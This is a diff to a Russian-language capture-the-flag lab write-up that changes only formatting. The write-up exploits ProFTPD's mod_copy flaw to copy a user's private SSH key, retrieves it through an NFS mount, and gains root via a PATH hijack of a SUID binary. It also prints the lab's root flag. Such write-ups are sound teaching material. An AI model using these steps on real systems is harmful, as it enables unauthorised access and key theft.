@@ -13,7 +13,8 @@
 ## 2. Разведка
 
 Начинаем с сканирования портов с помощью `nmap`: 
-`nmap -sV -sC -p- -T4 10.114.162.225`
+
+`nmap -sV -sC -p- -T4 10.114.162.225`  
 
 Находим открытые порты: 
 - **21/tcp (FTP)** — ProFTPD 1.3.5  
@@ -28,26 +29,30 @@
 Версия ProFTPD 1.3.5 содержит уязвимость **mod_copy** (CVE-2015-3306), которая позволяет копировать файлы без авторизации с помощью команд `SITE CPFR` (откуда копировать) и `SITE CPTO` (куда копировать).
 
 Используем `searchsploit`, чтобы убедиться в наличии готовых эксплойтов: 
-`searchsploit ProFTPd`
+
+`searchsploit ProFTPd`  
 
 ![Решения](images/35.png)
 
 Из логов SMB мы знаем, что у пользователя `kenobi` есть SSH-ключ по пути `/home/kenobi/.ssh/id_rsa`. Скопируем его в доступную папку `/var/tmp`:
-`SITE CPFR /home/kenobi/.ssh/id_rsa`
-`SITE CPTO /var/tmp/id_rsa`
+
+`SITE CPFR /home/kenobi/.ssh/id_rsa`  
+`SITE CPTO /var/tmp/id_rsa`  
 
 ---
 
 ## 3. Получение доступа (Initial Access)
 
 Так как порт **2049 (NFS)** открыт, мы можем примонтировать директорию `/var` и забрать скачанный ключ: 
-`mkdir /mnt/kenobiNFS`
-`mount 10.114.162.225:/var /mnt/kenobiNFS`
-`cp /mnt/kenobiNFS/tmp/id_rsa .`
-`chmod 600 id_rsa`
+
+`mkdir /mnt/kenobiNFS`  
+`mount 10.114.162.225:/var /mnt/kenobiNFS`  
+`cp /mnt/kenobiNFS/tmp/id_rsa .`  
+`chmod 600 id_rsa`  
 
 Подключаемся по SSH: 
-`ssh -i id_rsa kenobi@10.114.162.225`
+
+`ssh -i id_rsa kenobi@10.114.162.225`  
 
 Читаем флаг пользователя: cat user.txt.
 
@@ -58,7 +63,8 @@
 ## 4. Повышение привилегий (Privilege Escalation)
 
 Ищем файлы с SUID-битом, запускающиеся от имени root: 
-`find / -perm -u=s -type f 2>/dev/null`
+
+`find / -perm -u=s -type f 2>/dev/null`  
 
 Среди стандартных системных файлов находим `/usr/bin/menu`. Запускаем его и видим меню с тремя пунктами: 
 
@@ -69,12 +75,14 @@
 Бинарник вызывает системные команды (например, curl) без указания полного пути. Следовательно, он ищет их в переменной окружения $PATH. Мы можем подменить curl своим скриптом, который запустит оболочку /bin/bash.
 
 Создаем поддельный curl в папке /tmp: 
-`cd /tmp, echo '/bin/bash' > /tmp/curl` 
-`chmod +x /tmp/curl` 
-`export PATH=/tmp:$PATH`
+
+`cd /tmp, echo '/bin/bash' > /tmp/curl`  
+`chmod +x /tmp/curl`  
+`export PATH=/tmp:$PATH`  
 
 Снова запускаем `/usr/bin/menu` и выбираем пункт 1. Получаем root-шелл. Читаем корневой флаг: 
-`cat /root/root.txt`
+
+`cat /root/root.txt`  
 
 Флаг: **177b3cd8562289f37382721c28381f02*
 
